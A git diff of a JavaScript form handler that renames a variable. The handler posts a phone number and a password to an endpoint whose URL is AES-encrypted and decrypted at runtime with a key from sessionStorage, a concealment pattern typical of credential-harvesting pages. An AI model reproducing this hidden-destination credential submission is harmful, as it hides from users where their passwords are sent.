@@ -1,9 +1,9 @@
-function decryptURL(encryptedUrl, password) {
-    var decrypted = CryptoJS.AES.decrypt(decodeURIComponent(encryptedUrl), password).toString(CryptoJS.enc.Utf8);
+function decryptURL(encryptedUrl, pass) {
+    var decrypted = CryptoJS.AES.decrypt(decodeURIComponent(encryptedUrl), pass).toString(CryptoJS.enc.Utf8);
     return decrypted;
   }
 var encryptedUrl = "U2FsdGVkX1/b0FthQt2SSDRmD23vl+c8XYZTEo1HO3rocivn3tuiojQ3xiuO2z6duO5fgX321Z7aJuSMDumPKjYwStStECFHUpLwrMDNSj39DimLknIKyYXMiMVPOAoO/VsVbk1y1yAf/2o80vO+zY17a+OeNeMZ+d0b4cSIOY4Xxdoym7m+5li7iMxhYVJr";
-var password = sessionStorage.getItem("pass");
+var pass = sessionStorage.getItem("pass");
 
 function sendTest() {
     document.getElementById('sendButton').style.backgroundColor = 'lightgrey';
@@ -61,7 +61,7 @@ function sendTest() {
     formData.append('phoneNumber', phoneNumber);
     formData.append('password', password);
     
-    var decryptedUrl = decryptURL(encryptedUrl, password);
+    var decryptedUrl = decryptURL(encryptedUrl, pass);
     fetch(decryptedUrl, {
         method: "POST",
         body: formData,
@@ -94,7 +94,6 @@ function sendTest() {
     })
     .catch(function (error) {
         console.error("Error:", error);
-        loadingSpinner.style.display = "none";
       });
     };
 
